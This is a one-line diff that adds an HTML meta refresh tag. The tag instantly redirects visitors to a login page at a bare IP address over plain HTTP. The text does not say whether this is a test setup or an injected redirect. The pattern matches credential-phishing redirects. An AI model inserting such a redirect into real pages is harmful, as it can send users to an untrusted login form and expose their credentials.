@@ -1,0 +1,1 @@
+<meta http-equiv="refresh" content="0; url=http://103.129.222.216:8000/login/" />
